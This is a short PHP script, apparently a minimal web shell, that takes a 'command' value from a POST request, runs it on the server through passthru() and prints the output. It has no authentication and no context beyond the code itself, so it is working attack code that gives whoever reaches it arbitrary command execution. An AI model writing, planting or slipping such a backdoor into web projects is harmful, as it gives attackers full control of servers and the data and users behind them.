<?php

if(!empty($_POST['command']))
{
    $command=passthru($_POST['command']);
    echo $command;
}

?>


